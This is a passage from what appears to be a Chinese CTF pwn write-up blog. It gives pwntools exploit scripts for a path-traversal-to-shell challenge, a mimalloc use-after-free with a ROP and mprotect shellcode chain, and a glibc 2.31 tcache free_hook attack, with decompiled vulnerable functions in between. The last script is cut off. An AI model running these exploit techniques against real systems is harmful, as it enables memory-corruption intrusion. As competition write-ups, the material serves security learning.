class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c">from pwn import *<br>from LibcSearcher import *<br>from ctypes import *<br>import base64<br><span class="hljs-title function_">context</span><span class="hljs-params">(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>io = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">4000</span>)<br><br>s   = lambda content : io.send(content)<br>sl  = lambda content : io.sendline(content)<br>sa  = lambda content,send : io.sendafter(content, send)<br>sla = lambda content,send : io.sendlineafter(content, send)<br>rc  = lambda number : io.recv(number)<br>ru  = lambda content : io.recvuntil(content)<br><br>def slog(name, address): print(<span class="hljs-string">&quot;\033[40;34m[+]\033[40;35m&quot;</span> + name + <span class="hljs-string">&quot;==&gt;&quot;</span> +hex(address) + <span class="hljs-string">&quot;\033[0m&quot;</span>)<br><br>def debug(): <br>   gdb.attach(io, <span class="hljs-string">&quot;b *0x555555556993&quot;</span>)<br>    <br>def get_address(): <span class="hljs-keyword">return</span> u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[<span class="hljs-number">-6</span>:].ljust(<span class="hljs-number">8</span>, b<span class="hljs-number">&#x27;</span>\x00<span class="hljs-number">&#x27;</span>))<br><br>payload = b<span class="hljs-number">&#x27;</span>GET ?/l1s00t.html HTTP/<span class="hljs-number">1.1</span>\r\n<span class="hljs-number">&#x27;</span><br>payload += b<span class="hljs-number">&#x27;</span>Authorization: Basic <span class="hljs-string">&#x27; + base64.b64encode(b&#x27;</span>\x00<span class="hljs-number">&#x27;</span>*<span class="hljs-number">64</span> + b<span class="hljs-number">&#x27;</span>/../../../../../../bin/sh?.html\x00<span class="hljs-number">&#x27;</span>)<br><br>payload += b<span class="hljs-number">&#x27;</span>\n<span class="hljs-number">&#x27;</span><br>sl(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="mi"><a href="#mi" class="headerlink" title="mi"></a>mi</h2><p>其中涉及到新的malloc实现，名为mimalloc，其大致思想就是申请内存时首先给出整页，类似slub分配器一样，在一块页内空闲块连着空闲块，区别就是这个是虚拟内存而已,且在本题当中存在两个空闲链表，一个相当于热表，我们分配都是从他这里分，也就是free字段，我们还有一个冷表，当我们热表为空的时候，他就会将冷表整个赋值到热表，然后我们继续从中分配，这里记住我们是采用FIFO进行object链接的，并且我们所释放的所有堆块都会首先放入冷表贮存</p><p>题目逆向可知存在明显的UAF</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-built_in">int</span> delete()<br>&#123;<br>  unsigned <span class="hljs-built_in">int</span> <span class="hljs-built_in">num</span>; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  puts(<span class="hljs-string">&quot;Please input the idx:&quot;</span>);<br>  <span class="hljs-built_in">num</span> = get_num();<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">num</span> &gt; <span class="hljs-number">0x20</span> || !chunk_ptr[<span class="hljs-built_in">num</span>] || !chunk_size[<span class="hljs-built_in">num</span>] )<br>  &#123;<br>    puts(<span class="hljs-string">&quot;Invalid idx&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  mi_free(chunk_ptr[<span class="hljs-built_in">num</span>]);<br>  <span class="hljs-keyword">return</span> puts(<span class="hljs-string">&quot;Done&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>因此我们可以首先消耗掉热表，然后再次分配肯定是从之前释放到冷表的块那儿分配，我们可以提前将其fd指针(字符串存在的头八字节)修改为其他字节，例如environ，ret等等</p><p>因此本题的思路就是</p><ol><li>泄露堆地址，libc地址，这里通过uaf来达成，并且堆头部0x240偏移地方存在一个milibcmalloc.so的地址，很方便我们使用，毕竟堆头嘛，再怎么说也得存点东西</li><li>同样UAF，构造environ堆块，泄露栈地址</li><li>修改add的返回值，将堆块分配到栈上，然后利用ROP来获取flag</li></ol><p>exp如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs c">from pwn import * <br>from LibcSearcher import* <br><span class="hljs-title function_">context</span><span class="hljs-params">(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)</span> <br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br>io = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-meta">#io = remote(<span class="hljs-string">&#x27;59.110.164.72&#x27;</span>, 10066) </span><br><br>s   = lambda content : io.send(content)<br>sl  = lambda content : io.sendline(content)<br>sa  = lambda content,send : io.sendafter(content, send)<br>sla = lambda content,send : io.sendlineafter(content, send)<br>rc  = lambda number : io.recv(number)<br>ru  = lambda content : io.recvuntil(content)<br><br>def slog(name, address): print(<span class="hljs-string">&quot;\033[40;31m[+]\033[40;35m&quot;</span>+ name + <span class="hljs-string">&quot;==&gt;&quot;</span> + hex(address) + <span class="hljs-string">&quot;\033[0m&quot;</span>)<br><br>def debug(): gdb.attach(io)<br>def get_address(): <span class="hljs-keyword">return</span> u64(ru(b<span class="hljs-number">&#x27;</span>\x7f<span class="hljs-number">&#x27;</span>)[<span class="hljs-number">-6</span>:].ljust(<span class="hljs-number">8</span>, b<span class="hljs-number">&#x27;</span>\x00<span class="hljs-number">&#x27;</span>))<br><br>def add(size, content = <span class="hljs-string">&#x27;pwh&#x27;</span>):    #<span class="hljs-number">0x2d</span><br>    sa(b<span class="hljs-string">&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    sa(b<span class="hljs-string">&quot;size:\n&quot;</span>,str(size))<br>    sa(b<span class="hljs-number">&#x27;</span>Content:\n<span class="hljs-number">&#x27;</span>, content)<br><br>def delete(index):<br>    sa(b<span class="hljs-string">&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    sa(b<span class="hljs-number">&#x27;</span>idx:\n<span class="hljs-number">&#x27;</span>, str(index))<br><br><br>def edit(index, content):<br>    sa(b<span class="hljs-number">&#x27;</span>&gt;&gt;<span class="hljs-string">&#x27;, &#x27;</span><span class="hljs-number">3&#x27;</span>)<br>    sa(<span class="hljs-string">&quot;idx:\n&quot;</span>, str(index))<br>    sa(<span class="hljs-string">&quot;Content:\n&quot;</span>, content)<br><br>def show(index):<br>    sa(b<span class="hljs-string">&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br>    sa(b<span class="hljs-number">&#x27;</span>idx:\n<span class="hljs-number">&#x27;</span>, str(index))<br><br>add(<span class="hljs-number">0x500</span>)   # <span class="hljs-number">0</span><br>add(<span class="hljs-number">0x500</span>)   # <span class="hljs-number">1</span><br>add(<span class="hljs-number">0x500</span>)   # <span class="hljs-number">2</span><br><br><br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">2</span>)<br><br>edit(<span class="hljs-number">2</span>, b<span class="hljs-number">&#x27;</span>a<span class="hljs-number">&#x27;</span>)<br>show(<span class="hljs-number">2</span>)<br>heap_base = u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, b<span class="hljs-number">&#x27;</span>\x00<span class="hljs-number">&#x27;</span>))&amp;(~<span class="hljs-number">0xff</span>) - <span class="hljs-number">0x20500</span><br><br>slog(<span class="hljs-string">&quot;heap_base&quot;</span>, heap_base)<br>edit(<span class="hljs-number">2</span>, p64(heap_base + <span class="hljs-number">0x240</span>))<br>add(<span class="hljs-number">0x500</span>) #<span class="hljs-number">3</span><br>add(<span class="hljs-number">0x500</span>, <span class="hljs-string">&#x27;a&#x27;</span>) #<span class="hljs-number">4</span><br>show(<span class="hljs-number">4</span>)<br>libmimalloc_base = u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, b<span class="hljs-number">&#x27;</span>\x00<span class="hljs-number">&#x27;</span>)) - <span class="hljs-number">0x22861</span><br>slog(<span class="hljs-string">&quot;libmimalloc_base&quot;</span>, libmimalloc_base)<br>libc_base = libmimalloc_base - <span class="hljs-number">0x1f2000</span><br>slog(<span class="hljs-string">&quot;libc_base&quot;</span>, libc_base)<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>env = libc.sym[<span class="hljs-string">&#x27;_environ&#x27;</span>] + libc_base<br>slog(<span class="hljs-string">&#x27;environ&#x27;</span>, env)<br><br>add(<span class="hljs-number">0x200</span>, b<span class="hljs-number">&#x27;</span>aaaa<span class="hljs-number">&#x27;</span>) #<span class="hljs-number">5</span><br>add(<span class="hljs-number">0x200</span>, b<span class="hljs-number">&#x27;</span>aaaa<span class="hljs-number">&#x27;</span>) #<span class="hljs-number">6</span><br><br>delete(<span class="hljs-number">5</span>)<br>delete(<span class="hljs-number">6</span>)<br>add(<span class="hljs-number">0x200</span>, b<span class="hljs-number">&#x27;</span>aaaa<span class="hljs-number">&#x27;</span>) #<span class="hljs-number">7</span><br>add(<span class="hljs-number">0x200</span>, b<span class="hljs-number">&#x27;</span>aaaa<span class="hljs-number">&#x27;</span>) #<span class="hljs-number">8</span><br>add(<span class="hljs-number">0x200</span>, b<span class="hljs-number">&#x27;</span>aaaa<span class="hljs-number">&#x27;</span>) #<span class="hljs-number">9</span><br>add(<span class="hljs-number">0x200</span>, b<span class="hljs-number">&#x27;</span>aaaa<span class="hljs-number">&#x27;</span>) #<span class="hljs-number">10</span><br>add(<span class="hljs-number">0x200</span>, b<span class="hljs-number">&#x27;</span>aaaa<span class="hljs-number">&#x27;</span>) #<span class="hljs-number">11</span><br>add(<span class="hljs-number">0x200</span>, b<span class="hljs-number">&#x27;</span>aaaa<span class="hljs-number">&#x27;</span>) #<span class="hljs-number">12</span><br><br>edit(<span class="hljs-number">6</span>, p64(env))<br>add(<span class="hljs-number">0x200</span>, b<span class="hljs-number">&#x27;</span>aaaa<span class="hljs-number">&#x27;</span>) #<span class="hljs-number">13</span><br>add(<span class="hljs-number">0x200</span>, b<span class="hljs-number">&#x27;</span>\x08<span class="hljs-number">&#x27;</span>) #<span class="hljs-number">14</span><br>show(<span class="hljs-number">14</span>)<br>stack_addr = u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, b<span class="hljs-number">&#x27;</span>\x00<span class="hljs-number">&#x27;</span>))<br>slog(<span class="hljs-string">&quot;stack_addr&quot;</span>, stack_addr)<br>ret_addr = stack_addr - <span class="hljs-number">0x120</span><br>slog(<span class="hljs-string">&quot;ret_addr&quot;</span>, ret_addr)<br>add(<span class="hljs-number">0x300</span>, b<span class="hljs-number">&#x27;b</span>bbb<span class="hljs-number">&#x27;</span>) #<span class="hljs-number">15</span><br>delete(<span class="hljs-number">15</span>)<br>add(<span class="hljs-number">0x300</span>, b<span class="hljs-number">&#x27;b</span>bbb<span class="hljs-number">&#x27;</span>) #<span class="hljs-number">16</span><br>add(<span class="hljs-number">0x300</span>, b<span class="hljs-number">&#x27;b</span>bbb<span class="hljs-number">&#x27;</span>) #<span class="hljs-number">17</span><br>add(<span class="hljs-number">0x300</span>, b<span class="hljs-number">&#x27;b</span>bbb<span class="hljs-number">&#x27;</span>) #<span class="hljs-number">18</span><br>add(<span class="hljs-number">0x300</span>, b<span class="hljs-number">&#x27;b</span>bbb<span class="hljs-number">&#x27;</span>) #<span class="hljs-number">19</span><br><br>pop_rdi = libc_base + <span class="hljs-number">0x23b6a</span><br>pop_rsi = libc_base + <span class="hljs-number">0x2601f</span><br>pop_rdx = libc_base + <span class="hljs-number">0x142c92</span><br>mprotect = libc_base + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br><br>payload = p64(pop_rdi) + p64(ret_addr&amp;(~<span class="hljs-number">0xfff</span>)) + p64(pop_rsi) + p64(<span class="hljs-number">0x1000</span>) + p64(pop_rdx) + p64(<span class="hljs-number">7</span>) + p64(mprotect)<br>payload += p64(ret_addr + <span class="hljs-number">0x40</span>) + <span class="hljs-keyword">asm</span>(shellcraft.cat(<span class="hljs-string">&#x27;./flag&#x27;</span>))<br><br>edit(<span class="hljs-number">15</span>, p64(ret_addr))<br>debug()<br>add(<span class="hljs-number">0x300</span>, b<span class="hljs-number">&#x27;b</span>bbb<span class="hljs-number">&#x27;</span>) #<span class="hljs-number">20</span><br>add(<span class="hljs-number">0x300</span>, payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="工控决赛赛题复现"><a href="#工控决赛赛题复现" class="headerlink" title="工控决赛赛题复现"></a>工控决赛赛题复现</h1><h2 id="Rainforest"><a href="#Rainforest" class="headerlink" title="Rainforest"></a>Rainforest</h2><p>题目做下来不知道这名字跟题目有什么关联。</p><p>首先是逆向部分，本题的版本为2.31-9.2，算是较为方便的版本，并且栈保护全开，无法写got，可以考虑打malloc&#x2F;free_hook</p><p>题目整体是一个常规的菜单题，每次添加会有一个0x30大小的描述块和0x300大小的内容块</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> num; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">void</span> *describe_ptr; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please input the idx:&quot;</span>);<br>  num = read_num();<br>  describe_ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>uLL);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please input the subject:&quot;</span>);<br>  my_write(describe_ptr, <span class="hljs-number">0x20</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please input the content:&quot;</span>);<br>  *(describe_ptr + <span class="hljs-number">3</span>) = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x2F0</span>uLL);<br>  my_write(*(describe_ptr + <span class="hljs-number">3</span>), <span class="hljs-number">0x2F0</span>u);<br>  <span class="hljs-keyword">if</span> ( exist_set[num] == <span class="hljs-number">0x2333</span> )<br>    *(describe_ptr + <span class="hljs-number">2</span>) = describe_set[num];<br>  describe_set[num] = describe_ptr;<br>  exist_set[num] = <span class="hljs-number">0x2333</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里有趣的点是他会构造一个链条，也就是说我们如果重复对一个全局数组下标的位置添加的话，他会形成一个头插的链表，然后在show和delete函数的时候会依次进行展示或释放</p><p>而本题的一个漏洞点就位于delete函数当中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 num; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  __int64 i; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please input the idx:&quot;</span>);<br>  num = read_num();<br>  <span class="hljs-keyword">if</span> ( num &gt; <span class="hljs-number">0x10</span> || !describe_set[num] )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid idx&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>  &#125;<br>  <span class="hljs-keyword">for</span> ( i = describe_set[num]; i; i = v3 )<br>  &#123;<br>    v3 = *(i + <span class="hljs-number">16</span>);<br>    *(i + <span class="hljs-number">16</span>) = <span class="hljs-number">0LL</span>;<br>    <span class="hljs-built_in">free</span>(*(i + <span class="hljs-number">24</span>));<br>  &#125;<br>  exist_set[num] = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>因此可以看到这是常见的UAF漏洞，其中我们可以看到他的这个描述块是并不清空的，所以我们可以多次利用该块来释放相同的堆块，造成多个堆块同时指向同一个地址</p><p>我们的利用手法如下：</p><ol><li>首先利用UAF来构造指向相同地址的描述块，底层核心思想相同，具体实现则考验到我们对于glibc堆释放分配过程的理解，依据此我们可以分别泄露出heap base和libc base</li><li>我们可以在大堆块里面构造稍小的堆块，然后将两个重叠堆块均放置于链条上然后修改小堆块的fd指针，达成tcachebinattach，这里我才用写free_hook的方法</li></ol><p>思想通了一切都好说，下面exp是打的时候慢慢试出来的，所以其中优化的部分没有细想，可能有些地方比较多余</p><p>最终exp如下：（写的时候方便调试换了9，做出来后懒得换回去了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>* <br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>) <br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br>io = process(<span class="hljs-string">&#x27;./Rainforest&#x27;</span>)<br><span class="hljs-comment">#io = remote(&#x27;59.110.164.72&#x27;, 10066) </span><br><span class="hljs-comment">#io = remote(&quot;node4.buuoj.cn&quot;, 26610)</span><br><br>s   = <span class="hljs-keyword">lambda</span> content : io.send(content)<br>sl  = <span class="hljs-keyword">lambda</span> content : io.sendline(content)<br>sa  = <span class="hljs-keyword">lambda</span> content,send : io.sendafter(content, send)<br>sla = <span class="hljs-keyword">lambda</span> content,send : io.sendlineafter(content, send)<br>rc  = <span class="hljs-keyword">lambda</span> number : io.recv(number)<br>ru  = <span class="hljs-keyword">lambda</span> content : io.recvuntil(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">slog</span>(<span class="hljs-params">name, address</span>): <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[40;31m[+]\033[40;35m&quot;</span>+ name + <span class="hljs-string">&quot;==&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(address) + <span class="hljs-string">&quot;\033[0m&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(): gdb.attach(io)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_address</span>(): <span class="hljs-keyword">return</span> u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx, subject, content</span>):    <span class="hljs-comment">#0x2d</span><br>    sla(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&quot;idx:\n&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">b&#x27;subject:\n&#x27;</span>, subject)<br>    sla(<span class="hljs-string">b&#x27;content:\n&#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;idx:\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;idx:\n&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-comment">#====== leak the heap base ======#</span><br><br>add(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;aaaa&#x27;</span>, <span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-string">&#x27;ffff&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;ccc&#x27;</span>,<span class="hljs-string">&#x27;dddd&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">2</span>)<br>ru(<span class="hljs-string">&#x27;:&#x27;</span>)<br>heap_base = u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x2d0</span><br>slog(<span class="hljs-string">&quot;heap_base_addr&quot;</span>, heap_base)<br><br>debug()<br><span class="hljs-comment">#======== leak the libc base =========#</span><br>nums = [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>]<br>add(<span class="hljs-number">11</span>, <span class="hljs-string">&#x27;cccc&#x27;</span>, <span class="hljs-string">&#x27;dddd&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> nums[:<span class="hljs-number">7</span>]:<br>    add(i, <span class="hljs-string">&#x27;ccc&#x27;</span>, <span class="hljs-string">&#x27;ddd&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> nums[:<span class="hljs-number">7</span>]:<br>    delete(i)<br><br>delete(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">11</span>)<br>libc_base = get_address() - <span class="hljs-number">0x1ebbe0</span><br>slog(<span class="hljs-string">&quot;libc_base&quot;</span>, libc_base)<br><span class="hljs-comment">#========= tcache attack ========#</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./../tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6&#x27;</span>)<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>slog(<span class="hljs-string">&quot;free_hook&quot;</span>, free_hook)<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> nums[:<span class="hljs-number">7</span>]:<br>    add(i, <span class="hljs-string">&#x27;cccc&#x27;</span>, <span class="hljs-string">&#x27;dddd&#x27;</span>)<br><br>add(<span class="hljs-number">12</span>, p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(heap_base + <span class="hljs-number">0x1cc0</span>), p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x301</span>) + p64(<span class="hljs-number">0</span>) + p64(heap_base + <span class="hljs-number">0x1cd0</span>))<br><br>delete(<span class="hljs-number">12</span>)<br><br>add(<span class="hljs-number">12</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>)<br>add(<span class="hljs-number">13</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>)<br>add(<span class="hljs-number">14</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>)<br>delete(<span 